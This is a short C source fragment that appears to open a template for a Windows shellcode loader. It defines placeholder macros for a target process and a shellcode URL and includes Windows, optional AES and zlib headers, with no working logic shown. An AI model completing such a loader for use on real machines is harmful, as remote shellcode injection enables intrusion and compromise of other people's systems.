#define TARGET_PROCESS "$TARGET_PROCESS$"
#define SHELLCODE_URL "$SHELLCODE_URL$" 

#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#ifdef USE_ENCRYPTION
#include <openssl/aes.h>
#endif

#ifdef USE_COMPRESSION
#include <zlib.h>
#endif

#define BUFFER_SIZE 1024

